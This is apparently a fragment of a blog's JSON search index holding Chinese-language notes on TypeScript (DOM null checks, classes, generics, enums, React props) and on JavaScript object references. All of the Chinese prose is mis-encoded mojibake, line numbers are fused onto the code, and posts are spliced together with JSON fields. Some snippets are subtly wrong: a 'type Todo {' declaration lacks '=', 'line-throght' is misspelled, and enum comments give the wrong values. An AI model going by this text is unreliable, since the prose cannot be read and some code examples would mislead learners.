ï¼Œåƒé€™æ¨£ï¼š 12const anchor = document.querySelector('a')console.log(anchor.href) é€™æ™‚å€™å°±æœƒé¡¯ç¤ºéŒ¯èª¤èªªï¼šã€ŒObject is possibly nullã€ï¼Œé€™æ˜¯å› ç‚º TS é è¨­åˆ¤æ–· type é•·é€™æ¨£ï¼š å› ç‚ºåœ¨å¯« TS çš„æ™‚å€™ä»–ä¸æœƒçŸ¥é“ä½ é¸åˆ°çš„ DOM å…ƒç´ æ˜¯å¦çœŸçš„å­˜åœ¨ï¼Œæ‰€ä»¥ä»–æœƒå¹«ä½ åŠ ä¸Šä¸€å€‹ nullï¼Œä»£è¡¨é€™æœ‰å¯èƒ½æ˜¯ nullã€‚ è§£æ±ºçš„æ–¹æ³•æœ‰è »å¤šçš„ï¼Œåƒè€ƒä»¥ä¸‹å¹¾å€‹ï¼š 1234567891011121314151617// ç”¨ ? å¯é¸ä¸²é€£const anchor = document.querySelector('a')console.log(anchor?.href)// ç”¨ as ä¾†æ–·è¨€const anchor = document.querySelector('a') as HTMLAnchorElementconsole.log(anchor.href)// ç”¨ ! ä¾†ä¿è­‰ä»–çµ•å°ä¸æœƒæ˜¯ null æˆ– undefinedconst anchor = document.querySelector('a')!console.log(anchor.href)// ç”¨ if ä¾†ç¢ºä¿æœ‰å€¼çš„æ™‚å€™æ‰åšé€™ä»¶äº‹const anchor = document.querySelector('a')if (anchor) { console.log(anchor.href)} é€é selector ä¾†é¸å– DOM å…ƒç´ å¦‚æœå…ƒç´ æ˜¯é€é selector ä¾†é¸åˆ°çš„è©±ï¼ŒTS åªæœƒæŠŠä»–æŒ‡æ´¾ç‚º Element | null é€™å€‹ typeï¼Œæ‰€ä»¥ä½ å¯ä»¥è‡ªè¡ŒæŒ‡å®šï¼š 1234567891011const form = document.querySelector('.new-item-form') as HTMLFormElementconst type = document.querySelector('#type') as HTMLSelectElementconst toFrom = document.querySelector('#tofrom') as HTMLInputElementconst details = document.querySelector('#details') as HTMLInputElementconst amount = document.querySelector('#amount') as HTMLInputElement// event çš„ type æ˜¯ Eventform.addEventListener('submit', function (e: Event) { e.preventDefault() console.log(type.value, toFrom.value, details.value, amount.valueAsNumber)}) Class æœ¬èº«å¯ä»¥ç•¶æˆä¸€å€‹ type1234567891011121314151617181920212223class Invoice { client: string details: string amount: number constructor(c: string, d: string, a: number) { this.client = c this.details = d this.amount = a } format() { return `${this.client} has ${this.details} for ${this.amount}` }}const invoiceOne = new Invoice('peanu', 'bicycle', 300)const invoiceTwo = new Invoice('ppb', 'phone', 100)// æŠŠ Invoice ç•¶æˆé™£åˆ—çš„ typeconst invoices: Invoice[] = []// æ‰€ä»¥å°±å¯ä»¥æŠŠ instance æ”¾é€²å»invoices.push(invoiceOne, invoiceTwo) Class çš„ privateã€readOnlyã€publicé€™å€‹å¯«æ³•åœ¨ JS ä¸­å…¶å¯¦æ˜¯æ²’ä½œç”¨çš„ï¼Œä½†åˆ°äº† TS å°±ä¸ä¸€æ¨£äº†ï¼š 1234567891011121314151617181920212223242526class Invoice { private client: string // åªæœ‰ class èƒ½ Read &amp; Write readonly details: string // ä¸ç®¡æ˜¯èª°éƒ½åªèƒ½ Read public amount: number // instance ä¹Ÿèƒ½ Read &amp; Write constructor(client: string, details: string, amount: number) { this.client = client this.details = details this.amount = amount } format() { return `${this.client} has ${this.details} for ${this.amount}` }}const invoiceOne = new Invoice('peanu', 'bicycle', 300)const invoiceTwo = new Invoice('ppb', 'phone', 100)const invoices: Invoice[] = []invoices.push(invoiceOne, invoiceTwo)invoices.forEach((inv) =&gt; { console.log(inv.details, inv.amount, inv.format())}) åœ¨æ²’æœ‰æŒ‡å®šä»»ä½•é—œéµå­—æ™‚ï¼Œclass ä¸­çš„æ¯å€‹å±¬æ€§é è¨­éƒ½æ˜¯ publicï¼Œä»£è¡¨ä¸è«–æ˜¯ instance é‚„æ˜¯ class æœ¬èº«éƒ½å¯ä»¥å» Read &amp; Writeã€‚ private æ˜¯åªæœ‰ class å¯ä»¥ Read &amp; Writeï¼ŒreadOnly å‰‡æ˜¯ instance å’Œ class éƒ½åªèƒ½ Readã€‚ æ³›å‹ï¼ˆGenericsï¼‰æ³›å‹å°æˆ‘ä¾†èªªæ˜¯ä¸€ç¨®ã€Œæ²’æœ‰æ˜ç¢ºæŒ‡å®šï¼Œä½†åˆä¸å¸Œæœ›æ˜¯ any çš„ typeã€ï¼Œå…ˆä¾†çœ‹å€‹ç¯„ä¾‹ã€‚ å‡è¨­æœ‰ä¸€å€‹ function æ˜¯å°ˆé–€ç”¨ä¾†åŠ ä¸Š uid å±¬æ€§ï¼Œç„¶å¾Œé æœŸæœƒæ¥æ”¶ã€Œç‰©ä»¶ã€çš„ typeï¼š 1234const addUID = (obj: object) =&gt; { const uid = Math.floor(Math.random() * 100) return { ...obj, uid }} çœ‹èµ·ä¾†æ²’ä»€éº¼å•é¡Œï¼Œå¯æ˜¯ç•¶ä½ å¯«æˆé€™æ¨£æ™‚å°±æœƒå¾—åˆ°ä¸€å€‹éŒ¯èª¤ï¼š 12345678910111213const addUID = (obj: object) =&gt; { const uid = Math.floor(Math.random() * 100) return { ...obj, uid }}const me = { name: 'peanu', age: 24}const newMe = addUID(me)// Property 'name' does not exist on type '{ uid: number; }console.log(newMe.name) ç‚ºä»€éº¼æœƒé€™æ¨£ï¼Ÿé€™è£¡è¦å…ˆçŸ¥é“ TS æœ‰ä¸€å€‹ã€Œè‡ªå‹•åˆ¤æ–·ã€çš„æ©Ÿåˆ¶ï¼Œå°±æ˜¯åƒæˆ‘å€‘å®£å‘Š let a = '123' æ™‚ä»–æœƒè‡ªå‹•åˆ¤æ–· a: string çš„åŠŸèƒ½ã€‚ è€Œå‰›å‰›çš„ç¯„ä¾‹ä¸­æˆ‘å€‘åªæœ‰æŒ‡å®š obj: objectï¼Œä¸¦ä¸”æœ€å¾ŒæŠŠ {...obj, uid} å›å‚³å‡ºå»ã€‚ å•é¡Œå°±å‡ºåœ¨é€™é‚Šï¼ŒTS æ€éº¼æœƒçŸ¥é“ object é•·æ€æ¨£ï¼Ÿä»–å”¯ä¸€èƒ½çŸ¥é“çš„å°±æ˜¯ä¸€å®šæœƒæœ‰ uid é€™å€‹å±¬æ€§ï¼Œå› ç‚ºä»–æ˜¯å¯«æ­»çš„ã€‚ æ‰€ä»¥é€™æ™‚å€™å°±å¯ä»¥ç”¨ã€Œæ³›å‹ã€çš„æ–¹å¼ä¾†æ”¹å¯«ï¼š 12345678910111213141516// é æœŸåœ¨å‘¼å«é€™å€‹ function æ™‚æœƒå‚³å…¥ Type// é€™å€‹ &lt;T&gt; å°±æœƒè®Šæˆ (obj: T) çš„é¡åˆ¥const addUID = &lt;T&gt;(obj: T) =&gt; { const uid = Math.floor(Math.random() * 100) return { ...obj, uid }}const me = { name: 'peanu', age: 24}// é€™é‚Šæ²’æœ‰æŒ‡å®š &lt;T&gt;ï¼Œæ‰€ä»¥æœƒè‡ªå‹•æŠŠ me çš„å…§å®¹ç•¶ä½œ &lt;T&gt;const newMe = addUID(me)// é€™æ¨£å°±èƒ½å¤ å­˜å–ï¼Œè€Œä¸”é‚„æœƒè‡ªå‹•å½ˆå‡ºå°æ‡‰çš„ popupconsole.log(newMe.name) é€™é‚Šæˆ‘é‚„æ˜¯ä¸å¤ªç†Ÿï¼Œä¸éæˆ‘æ˜¯é€™æ¨£è¨˜çš„ï¼š &lt;T&gt; æˆ‘è¦ç”¨æ³›å‹ä¾†æŒ‡å®š type (obj: T) æ„æ€æ˜¯ obj çš„ type æœƒæ ¹æ“šã€Œæˆ‘ã€æˆ–ã€Œè‡ªå‹•åˆ¤æ–·ã€æŒ‡å®šçš„ &lt;T&gt; ä¾†æ±ºå®š å¯æ˜¯æˆ‘åªå¸Œæœ›å¥¹å°±æ˜¯ object è©²æ€éº¼è¾¦ï¼Ÿä½ å¯èƒ½æœƒä»¥ç‚ºè¦é€™æ¨£å¯«ï¼š 12345678910111213const addUID = &lt;T&gt;(obj: T) =&gt; { const uid = Math.floor(Math.random() * 100) return { ...obj, uid }}const me = { name: 'peanu', age: 24}// æŒ‡å®šç‚º objectconst newMe = addUID&lt;object&gt;(me)// Property 'name' does not exist on type 'object &amp; { uid: number; }'console.log(newMe.name) é€™æ¨£æ˜¯ä¸å°çš„ï¼Œé€™æ¨£å°±è®Šæˆæœ€ä¸€é–‹å§‹çš„æ„æ€äº†ã€‚ å¦‚æœä½ çœŸçš„å¸Œæœ› &lt;T&gt; è¦ä¾·é™åœ¨æŸå€‹ç¯„åœä¸­ï¼Œå¯ä»¥ç”¨ extends çš„æ–¹å¼ä¾†æŒ‡å®šï¼š 123456789101112const addUID = &lt;T extends object&gt;(obj: T) =&gt; { const uid = Math.floor(Math.random() * 100) return { ...obj, uid }}const me = { name: 'peanu', age: 24}const newMe = addUID(me)console.log(newMe.name) ç•¶ç„¶ï¼Œä½ ä¹Ÿå¯ä»¥ç”¨è¶…åš´æ ¼çš„æ–¹å¼ä¾†æŒ‡å®šï¼š 123456789101112131415161718interface Person { name: string age: number}// ä¾·é™åœ¨ Person é€™å€‹ typeconst addUID = &lt;T extends Person&gt;(obj: T) =&gt; { const uid = Math.floor(Math.random() * 100) return { ...obj, uid }}const me = { name: 'peanu', age: 24}const newMe = addUID(me)console.log(newMe.name) é€™æ¨£å­ä¹Ÿä¸æ˜¯ä¸è¡Œï¼Œåªæ˜¯å°±å¤±å»äº†æ³›å‹çš„æ„ç¾©äº†ï¼Œå› ç‚ºé€™è·Ÿ obj: Person çš„æ„æ€æ²’å…©æ¨£ï¼Œæ‰€ä»¥é€šå¸¸ä¸æœƒç”¨é€™éº¼åš´æ ¼çš„æ–¹å¼ä¾†æŒ‡å®š typeã€‚ æœ€å¾Œåœ¨é™„ä¸Šä¸€å€‹ç¤ºç¯„ï¼Œæˆ‘æƒ³æé†’çš„æ˜¯æ³›å‹ä¸¦ä¸æ˜¯åªèƒ½ç”¨åœ¨ function ä¸Šï¼Œä»–å¯ä»¥æ‡‰ç”¨åœ¨å„ç¨®åœ°æ–¹ï¼Œåƒæ˜¯ interfaceã€type å’Œ class ç­‰ç­‰ã€‚ 123456789101112131415161718192021222324252627282930interface Live&lt;T&gt; { title: string address: string url: string date: T // å¯èƒ½å¸Œæœ›æ˜¯ object, array, string etc...}// &lt;T&gt; = Dateconst live1: Live&lt;Date&gt; = { title: \"Peanu's birthday\", address: 'internet', url: 'https://birthday.com', date: new Date()}// &lt;T&gt; = stringconst live2: Live&lt;string&gt; = { title: \"Peanu's birthday\", address: 'internet', url: 'https://birthday.com', date: '2022-07-12'}// &lt;T&gt; = numberconst live3: Live&lt;number&gt; = { title: \"Peanu's birthday\", address: 'internet', url: 'https://birthday.com', date: 20220712} è£œå……é †é“ä¸€æï¼Œå¦‚æœä½ æ˜¯åœ¨ React çš„ Component ä¸­ä½¿ç”¨æ³›å‹çš„è©±ï¼Œè¦ç›¡é‡é¿å…ç”¨ arrow function ä¾†å®šç¾©ï¼Œå› ç‚ºæœƒè·Ÿ JSX çš„ &lt;&gt; ææ··ã€‚ Do thisï¼š 123function Table&lt;Titem&gt;(props: TableProps&lt;Titem&gt;) { return null} Not thisï¼š 1234// ç„¡æ³•å€åˆ†æ˜¯ JSX é‚„æ˜¯æ³›å‹const Table = &lt;Titem&gt;(props: TableProps&lt;Titem&gt;) =&gt; { return null} Enumç°¡å–®ä¾†èªªå°±æ˜¯ã€Œä»£è™Ÿã€ 1234567891011121314151617181920212223242526272829303132// æ¯å€‹ä»£è™Ÿæœƒå°æ‡‰åˆ°çš„å€¼enum Status { SUCCESS = 1, ERROR = -1, FAIL = 0}interface Live { title: string streammer: string time: number status: Status}const live1: Live = { title: 'PeaNu Birthday', streammer: 'PeaNu', time: Date.now(), status: Status.SUCCESS // 1}const live2: Live = { title: 'PeaNu Birthday', streammer: 'PeaNu', time: Date.now(), status: Status.FAIL // 1}const live3: Live = { title: 'PeaNu Birthday', streammer: 'PeaNu', time: Date.now(), status: Status.ERROR // 1} é€™æ¨£å¯«çš„ç›®çš„æ˜¯ç•¶æœ‰ä¸€å †ä»£è™Ÿæ™‚æ¯”è¼ƒä¸æœƒæ··äº‚ï¼Œä¸éè¦æ³¨æ„ç·¨è­¯å®Œçš„çµæœä¸€æ¨£æœƒæ˜¯ä»£è™Ÿï¼Œé€™åªæ˜¯è®“é–‹ç™¼çš„æ™‚å€™æ¯”è¼ƒå¥½è®€è€Œå·²ã€‚ æŠŠ Object å¾ Array æŠ½å‡ºä¾†çš„æ–¹æ³•ä¹‹å‰çªç„¶æœ‰é€™å€‹éœ€æ±‚ï¼Œæ‰€ä»¥è¨˜éŒ„ä¸€ä¸‹ï¼Œè©³ç´°å¯ä»¥åƒè€ƒé€™ç¯‡ 12345export interface Cache { events: Event[] users: User[]}type CacheType = Event[] | User[] 1type Unpacked&lt;T&gt; = T extends (infer U)[] ? U : T 1type InnerCacheType = Unpacked&lt;CacheType&gt; // Event | User æƒ³çŸ¥é“åŸç†çš„è©±å¯ä»¥å†åƒè€ƒé€™ç¯‡","link":"/2022/07/21/typescript-review-and-note/"},{"title":"å¾ Object çš„ç­‰è™Ÿä¾†çœŸæ­£ç†è§£è®Šæ•¸","text":"è®Šæ•¸çœŸçš„æ˜¯ä½ æƒ³åƒä¸­çš„é‚£å€‹è®Šæ•¸å—ï¼Ÿ è®Šæ•¸å„²å­˜çš„åˆ°åº•æ˜¯ä»€éº¼ï¼Ÿå¦‚é¡Œï¼Œå› ç‚ºæ˜¯ç­†è¨˜å‘æ‰€ä»¥å°±ä¸èŠ±å¤ªå¤šæ™‚é–“é‹ªæˆã€‚æ‰€ä»¥å°±é–‹é–€è¦‹å±±çš„èªªäº†ï¼š è®Šæ•¸å¯ä»¥å„²å­˜çš„å€¼æœ‰å…©ç¨® ä¸€ç¨®æ˜¯ã€Œæ±è¥¿æœ¬èº«ã€ï¼Œä¸€ç¨®æ˜¯ã€Œè¨˜æ†¶é«”ä½å€ã€ã€‚ å…ˆæ¸¬è©¦çœ‹çœ‹ä½ èƒ½ä¸èƒ½å›ç­”å‡ºä¸‹é¢çš„å•é¡Œï¼š 1234console.log([] === [])console.log([0] === [0])console.log({} === {}) console.log({a: 1} === {a: 1}) å¦‚æœä½ çš„å›ç­”æ˜¯ï¼šfalse false false falseï¼Œé‚£æ­å–œä½ ï¼Œä½ æ˜¯å°çš„ã€‚ ä¾†çœ‹çœ‹ç‚ºä»€éº¼å§ï¼Œå…ˆè®“æˆ‘å€‘çœ‹å¦å¤–ä¸€å€‹ä¾‹å­ï¼š 123var obj1 = {a: 1}var obj2 = {a: 1}console.log(obj1 === obj2) æœ€å¾Œæœƒè¼¸å‡ºçš„çµæœæœƒæ˜¯ falseã€‚ ä½ å¯èƒ½æœƒå¾ˆç–‘æƒ‘ï¼Œæƒ³èªªä¸æ˜¯æ‡‰è©²æœƒåƒé€™æ¨£å­å—ï¼š 123var a = 5var b = 5console.log(a === b) // true æ˜æ˜éƒ½æ˜¯æŠŠæ±è¥¿å­˜åˆ°è®Šæ•¸è£¡é¢ï¼Œç‚ºä»€éº¼ å­˜çš„æ±è¥¿ä¸ä¸€æ¨£ æœƒæœ‰ä¸åŒçš„çµæœï¼Ÿ ä½ å¯ä»¥åƒè€ƒä¸‹é¢å…©å¼µåœ–ã€‚ åœ¨ä½ å„²å­˜æ•¸å­—çš„æ™‚å€™ï¼Œå…¶å¯¦æ˜¯é€™æ¨£å­ï¼š ä½†ä½ å„²å­˜ç‰©ä»¶çš„æ™‚å€™ï¼Œå»æ˜¯é€™æ¨£å­ï¼š 0x01 è·Ÿ 0x05 æ˜¯è¨˜æ†¶é«”ä½å€çš„ç·¨è™Ÿï¼Œæˆ‘ç¿’æ…£å«å®ƒã€ŒæŒ‡æ¨™ã€ï¼ˆåœ¨ C èªè¨€è£¡æ˜¯é€™æ¨£ç¨±å‘¼çš„ï¼‰ æ‰€ä»¥ç†è§£é€™å…©å€‹å·®ç•°å¾Œï¼Œé€™æ¨£å°±èªªå¾—é€šäº†ã€‚ç•¶ä½ å¯« obj1 === obj2 æ™‚ï¼Œå…¶å¯¦æ˜¯ç­‰æ–¼åœ¨å•ã€Œ0x01 === 0x05 å—ï¼Ÿã€ï¼Œé€™ç¨®æ„Ÿè¦ºã€‚ ç•¶ç„¶ï¼Œ0x01 è·Ÿ 0x05 é¡¯ç„¶æ˜¯å…©å€‹ä¸åŒçš„æ±è¥¿ã€‚ æ‰€ä»¥ï¼Œç•¶è®Šæ•¸å„²å­˜çš„æ±è¥¿ä¸æ˜¯ Stringã€Booleanã€Numberã€undefinedã€null æ™‚ï¼Œéƒ½æ˜¯æ¡ç”¨ç‰©ä»¶é€™ç¨®å„²å­˜ã€ŒæŒ‡æ¨™ã€çš„æ–¹å¼ä¾†å­˜æ±è¥¿ã€‚ undefined è·Ÿ null ä¹Ÿæ˜¯ç”¨ã€Œæ”¾æ±è¥¿ã€çš„æ–¹å¼å„²å­˜å“¦ï¼Œç‰¹åˆ¥åšå€‹ç¯„ä¾‹æé†’è‡ªå·±ï¼š 123456var a = undefinedvar b = undefinedvar c = nullvar d = nullconsole.log(a === b) // trueconsole.log(c === d) // true ä»€éº¼æ˜¯åƒè€ƒå€¼ï¼Ÿä¸çŸ¥é“ä½ æœ‰æ²’è½éä¸€ç¨®èªªæ³•ï¼šç‰©ä»¶å„²å­˜çš„æ˜¯ä¸€å€‹åƒè€ƒå€¼ ä»¥å‰æˆ‘è¦ºå¾—é€™å€‹èªªæ³•å¾ˆæŠ½è±¡ï¼Œä½†å…¶å¯¦æ¦‚å¿µå¾ˆç°¡å–®ï¼Œè®“æˆ‘å€‘çœ‹å€‹ä¾‹å­ï¼š 1234var obj1 = {a: 1}var obj2 = obj1 obj2.a = 10console.log(obj1.a === obj2.a) å¦‚æœå‰é¢è¬›çš„æ±è¥¿ä½ æœ‰ç†è§£çš„è©±ï¼Œæ‡‰è©²èƒ½çŒœåˆ°é€™é¡Œçš„çµæœæ˜¯ true ä¸€æ¨£ä¾†çœ‹åœ–èªªæ•…äº‹ï¼š åœ¨ä½ åš obj2 = obj1 æ™‚ï¼Œå¯ä»¥æƒ³æˆæ˜¯ obj2 = 0x01 é€™å€‹æ„æ€ï¼Œobj2 å„²å­˜çš„é€™å€‹å€¼å°±æ˜¯æˆ‘å€‘ä¸€é–‹å§‹æåˆ°çš„é‚£å€‹ã€Œåƒè€ƒå€¼ã€ã€‚ æ‰€ä»¥ obj2.a = 10 çš„æ„æ€å…¶å¯¦æ˜¯ã€ŒæŠŠ 0x01 è£¡é¢çš„ a æ”¹æˆ 10ã€çš„æ„æ€ï¼Œé€™ä¹Ÿè§£é‡‹ç‚ºä»€éº¼ obj1.a === obj2.a æœƒå¾—åˆ° trueï¼Œå› ç‚ºæ”¹çš„å°±æ˜¯åŒä¸€å€‹æ±è¥¿ã€‚ ç‚ºäº†è®“ä½ æŠŠè®Šæ•¸çš„è§€å¿µå­¸å¥½ï¼Œç¾åœ¨å†ä¾†è€ƒä½ ä¸€é¡Œï¼š 1234var obj1 = {a: 1}var obj2 = obj1 obj2 = {a: 10}console.log(obj1.a === obj2.a) // true ? false ? ç­”æ¡ˆæ˜¯ falseã€‚ å…¶å¯¦åœ¨ obj2 = {a: 10} é€™è¡ŒæŒ‡ä»¤è¢«åŸ·è¡Œä¹‹å‰ï¼Œobj1 è·Ÿ obj2 çš„é—œä¿‚å°±è·Ÿå‰›å‰›ç•«çš„åœ–ç‰‡æ˜¯ä¸€æ¨£çš„ã€‚ å¯æ˜¯ç•¶é€™è¡ŒæŒ‡ä»¤è¢«åŸ·è¡Œå¾Œï¼Œç™¼ç”Ÿäº†é€™ä»¶äº‹ï¼š ç°¡å–®ä¾†èªªï¼Œæœƒæœ‰é€™æ¨£çš„å·®ç•°æ˜¯å› ç‚ºã€Œè³¦å€¼å°è±¡ã€ä¸åŒçš„é—œä¿‚ï¼š obj2.a = 10 è³¦å€¼çš„å°è±¡æ˜¯ã€Œ0x01 è£¡é¢çš„ aã€ obj2 = {a: 10}è³¦å€¼çš„å°è±¡æ˜¯ã€Œobj2ã€ æ‰€ä»¥æœ€å¾Œæ‰æœƒæœ‰é€™æ¨£ä¸åŒçš„çµæœã€‚ å¿˜äº†æé‚£å€‹è·Ÿ Object ææ›–æ˜§çš„å‚¢ä¼™ï¼ˆArrayï¼‰Array å…¶å¯¦å°±æ˜¯ç‰©ä»¶çš„ä¸€ç¨®ï¼Œä¸ä¿¡çš„è©±è‡ªå·± typeof === []ã€‚ æ‰€ä»¥å®ƒçš„è®Šæ•¸å„²å­˜æ–¹å¼å°±è·Ÿç‰©ä»¶ä¸€æ¨¡ä¸€æ¨£ï¼Œä¾†çœ‹äº›ä¾‹å­ï¼š 123456var arr1 = [1]var arr2 = arr1 arr2.push(3)console.log('arr1: ' + arr1) // arr1: 1,3console.log('arr2: ' + arr2) // arr2: 1,3console.log(arr1 === arr2) // true å®ƒçš„è¡Œç‚ºå°±è·Ÿå‰é¢çš„åœ–ä¸€æ¨£ï¼Œæˆ‘æ‡¶å¾—ç•«äº†ï¼Œå¿˜è¨˜äº†å¯ä»¥è‡ªå·±æ‹‰å›å»ä¸Šé¢çœ‹ã€‚ å†ä¾†ä¸€å€‹ä¾‹å­ï¼š 12345678var arr1 = []var arr2 = arr1arr2.push(1)arr2 = [1, 2, 3]console.log(arr1) // [1]console.log(arr2) // [1, 2, 3]console.log(arr1 === arr2) // false é€™é¡Œä¹Ÿç†è§£çš„è©±å°±æ²’ä»€éº¼å•é¡Œäº†ã€‚ ç¸½çµæœ€å¾Œç¸½çµä¸€ä¸‹å¹¾å€‹é›·é»ï¼š è³¦å€¼çµ¦è®Šæ•¸å€¼ï¼Œè¦ææ¸…æ¥šå®ƒå­˜çš„æ˜¯ã€Œæ±è¥¿æœ¬èº«ã€ï¼Œé‚„æ˜¯ã€Œåƒè€ƒå€¼ã€ï¼Ÿ å°ä¸€å€‹è®Šæ•¸é‡æ–°è³¦å€¼æ™‚ï¼Œè¦ææ¸…æ¥šä½ ã€Œè³¦å€¼çš„å°è±¡æ˜¯èª°ï¼Ÿã€æ˜¯ã€Œè®Šæ•¸æœ¬èº«ã€ï¼Œé‚„æ˜¯ã€Œåƒè€ƒå€¼è£¡çš„æ±è¥¿ã€","link":"/2021/12/16/understand-variable-from-object/"},{"title":"å†æ¢ TypeScript","text":"å¸Œæœ›èƒ½è¶Šä¾†è¶Šç†Ÿæ‚‰ã€‚ ç°¡è¿°ç¹¼ä¸Šæ¬¡å¯«å®Œ TtypeScript åŸºç¤å¾Œï¼Œåˆåšäº†ä¸€å€‹ Todo-list ä¾†ç·´ç¿’ã€‚é€™ç¯‡ç­†è¨˜æ˜¯ç”¨ä¾†æŠŠæˆ‘åŸæœ¬æ²’å¾ˆæ‡‚çš„åœ°æ–¹å¼„å¾—æ›´æ¸…æ¥šä¸€äº›ã€‚ éŒ¯èª¤è¨Šæ¯ 1 123456789function App () { return ( &lt;&gt; &lt;TodoListItem /&gt; &lt;/&gt; )}export default App; é€™å€‹çš„æ„æ€æ˜¯èªªï¼ŒTodoListItem è£¡é¢æœ‰è¨­å®šæœƒæ¥æ”¶åˆ° todo é€™å€‹ propsï¼Œä½†ä½ æ²’æœ‰çµ¦ä»–ã€‚ TodoListItem çš„å…§å®¹ï¼š 1234567891011121314151617181920import React from \"react\";// æ¥æ”¶çš„ propsï¼Œé æœŸæœƒæœ‰ä¸€å€‹ todo// todo çš„å…§å®¹å‰‡æ˜¯ Todoï¼ˆinterfaceï¼‰interface Props { todo: Todo}// 1. æŒ‡å®š type ç‚º React.FC// 2. ç”¨æ³›å‹å‘Šè¨´ä»–æˆ‘å¸Œæœ› type æ˜¯ Props interface çš„å…§å®¹export const TodoListItem: React.FC&lt;Props&gt; = ({ todo }) =&gt; { return ( &lt;li&gt; &lt;label style={{ textDecoration: todo.complete ? 'line-throght' : undefined }}&gt; &lt;input type=\"checkbox\" checked={todo.complete} /&gt; &lt;/label&gt; &lt;/li&gt; )} éŒ¯èª¤è¨Šæ¯ 2 é€™å€‹æ„æ€å°±æ˜¯ä½ æ²’æœ‰å¹«ä»–æŒ‡å®š type çš„æ„æ€ã€‚ Type Declaration Fileä¸€å€‹å°æŠ€å·§ï¼Œä½ å¯ä»¥å»ºç«‹ *.d.ts çš„æª”æ¡ˆä¾†ç•¶ä½œ type çš„å®£å‘Šï¼ˆå› ç‚ºç·¨è­¯å™¨æœƒè‡ªå‹•åˆ¤æ–·ï¼‰ï¼Œé€™æ¨£å­å°±ä¸ç”¨å†é€é module ä¾† import / export ä½¿ç”¨ã€‚ Array èˆ‡ Objectè³‡æ–™å‹æ…‹æ˜¯ Array çš„è©±ï¼Œé™¤äº†å‘Šè¨´ TS æ˜¯é™£åˆ—ä»¥å¤–ï¼Œé‚„è¦é †ä¾¿å‘Šè¨´å®ƒå€¼çš„ type æ˜¯ä»€éº¼ï¼Œåƒé€™æ¨£ï¼š 1234// ä¸€ç¶­é™£åˆ—ï¼Œå€¼ç‚º stringlet arr1: string[] = ['a', '123'];// äºŒç¶­é™£åˆ—ï¼Œä¸”å€¼ç‚º stringlet arr2: string[][] = [['a'], ['b']]; å¦‚æœæ˜¯ Array åŒ… Object çš„è©±ï¼Œå¯ä»¥å…ˆè‡ªå®šç¾©ä¸€å€‹ typeï¼Œå†æŠŠå®ƒè¨­ç‚º Array çš„å€¼ï¼š 12345678910111213141516// ä¹Ÿå¯ä»¥ interfaceï¼Œè¨˜å¾—åˆ†æ¸…æ¥šå·®ç•°å°±å¥½type Todo { id: number, name: string, isDone: boolean}// type æ˜¯ Arrayï¼Œè€Œå€¼æ˜¯ Todoï¼ˆä¸Šé¢å¯«çš„ï¼‰const todos: Todo[] = [ { id: 0, name: 'todo1', isDone: true }] è‡³æ–¼ Object çš„è©±é€šå¸¸æœƒç”¨ type æˆ– interface ä¾†æè¿°ï¼š 123456789101112131415161718type Card1 = { name: string, des: string,}interface Card2 { name: string, des: string,}const obj1: Card1 = { name: \"PeaNu\", des: \"hello\",};const obj2: Card2 = { name: \"PeaNu\", des: \"hello\",} å¦‚æœè¦æ±ºå®š Object çš„ key è·Ÿ value å€¼ï¼Œé€™é‚Šæä¾›ä¸€å€‹ç¯„ä¾‹ï¼š å‡è¨­æˆ‘å¸Œæœ›ä¸€å€‹ Object çš„å€¼å¦‚ä¸‹ï¼š 1234567891011121314const obj = { username: [ { required: true, message: \"Pleaase enter your username\", }, ], password: [ { required: true, message: \"Please enter your password\" } ]} é‚£ä»–çš„ type å°±æœƒé€™æ¨£è¨­ï¼š 1234567891011121314151617181920type Rules = { required: boolean, message: string}// { [key]: value }const rules: { [key: string]: Rules[] } = { username: [ { required: true, message: \"Pleaase enter your username\", }, ], password: [ { required: true, message: \"Please enter your password\" } ]} è‡³æ–¼ key ç”¨ [] åŒ…ä½æ˜¯å› ç‚ºæˆ‘å€‘åœ¨å­˜å–å±¬æ€§æ™‚æœƒé€™æ¨£å¯« obj[key]ï¼Œåªè¦é€™æ¨£å­æƒ³å°±ä¸æœƒè¦ºå¾—å›°æƒ‘äº†ã€‚ Functionfunction å¯ä»¥æŒ‡å®šå…©å€‹æ±è¥¿ï¼š åƒæ•¸ å›å‚³å€¼ ç°¡å–®ç¤ºç¯„ä¸€ä¸‹ normal è·Ÿ arrow çš„å·®åˆ¥ï¼š 12345678910const logContent = (content: string): void =&gt; { console.log(content)}function logContent2 (content: string): void { console.log(content);}logContent(\"test1\");logContent2(\"test2\"); é™¤äº†è¨­å®šå‹åˆ¥ä»¥å¤–ï¼Œä¹Ÿå¯ä»¥è¨­å®šåƒæ•¸çš„å€¼å¿…é ˆæ˜¯ä»€éº¼ï¼š 12345678// æŒ‡å®šå€¼å¿…é ˆæ˜¯ A æˆ– Bfunction getItem (key: 'A' | 'B'): void { console.log(key)}getItem('A');getItem('B');getItem('C'); // é€™å€‹ä¸å¯ä»¥ as çš„ç”¨æ³•å®ƒä¸æ˜¯ç”¨åœ¨è®Šæ•¸èº«ä¸Šï¼Œè€Œæ˜¯ç”¨åœ¨æŸå€‹å€¼ï¼Œç¬¬ä¸€ç¨®æ˜¯ ã€ŒAPI responseã€ï¼š 123456async function getData() { const res = await fetch('https://jsonplaceholder.typicode.com/todos/1'); // å¦‚æœæ²’æœ‰ as Dataï¼Œå°±æœƒè¢«ç•¶ä½œ any const data = await res.json() as Data; console.log(data);} ç¬¬äºŒç¨®æ˜¯ç”¨åœ¨ã€Œè®Šæ•¸è³¦å€¼ã€ï¼š 123456789101112const data1: Data = { \"userId\": 1, \"id\": 1, \"title\": \"delectus aut autem\", \"completed\": false}type Data2 = { name: string}const data2 = data1 as unknown as Data2; å¦‚æœç›´æ¥æŠŠ data1 è³¦å€¼çµ¦ data2ï¼Œé‚£ data2 å°±æœƒç¹¼æ‰¿ data1 çš„ type ï¼ˆDataï¼‰ã€‚ ä¸å¸Œæœ›é€™æ¨£çš„è©±å°±å¾—ç”¨ as ä¾†ã€Œæ–·è¨€ã€ï¼Œé€™é‚Šæ˜¯æŠŠå®ƒæ–·è¨€ç‚º Data2 é€™å€‹ typeã€‚ç•¶ç„¶ï¼Œä¹Ÿå¯ä»¥æ–·è¨€æˆä¸€èˆ¬çš„ stringã€number ç­‰ç­‰ã€‚ React çš„å°æé†’ Props éœ€è¦å®šç¾© type 123456789101112131415161718192021222324252627// ä»¥ä¸‹é‚£å…©å€‹ type åŸºæœ¬ä¸Šæœƒå¯«åœ¨ *.d.ts æª”æ¡ˆè£¡// ç¾åœ¨åªæ˜¯ç‚ºäº†æ–¹ä¾¿ç†è§£æ‰å¯«åœ¨é€™// æ¥æ”¶åˆ°çš„ todotype Todo = { id: number, 